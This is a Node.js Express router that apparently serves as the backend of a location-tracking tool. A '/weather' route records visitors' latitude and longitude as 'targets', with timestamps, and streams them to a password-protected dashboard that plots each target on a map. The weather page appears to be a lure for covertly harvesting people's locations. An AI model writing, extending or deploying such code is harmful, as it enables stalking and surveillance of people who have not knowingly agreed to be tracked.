const express = require("express")
const router = express.Router()
const config = require("./config")
const { loadTargets, saveTargets } = require("./storage")


const TARGETS = loadTargets()

// login page 
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }

    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    if (typeof id !== "string" || id.length === 0 || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
        return res.status(400).send("Invalid location data")
    }

    const now = new Date().toISOString()
    const isNewTarget = TARGETS[id] == null

    if (isNewTarget) {
        TARGETS[id] = {
            location: [Number(lat), Number(lng)],
            firstSeen: now,
            lastSeen: now,
        }
    } else {
        TARGETS[id].location = [Number(lat), Number(lng)]
        TARGETS[id].lastSeen = now
    }

    saveTargets(TARGETS)
    IO.emit("user-connected", {
        id,
        firstSeen: TARGETS[id].firstSeen,
        lastSeen: TARGETS[id].lastSeen,
    })
    IO.emit("map-data", {
        id,
        lat,
        lng,
        firstSeen: TARGETS[id].firstSeen,
        lastSeen: TARGETS[id].lastSeen,
    })
    res.send("OK")
    console.log(`> ${id} - ${TARGETS[id].location} - ${now}`)
})

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query

    const target = TARGETS[id]
    res.render("map", { data: target ? target.location : null })
})


module.exports = router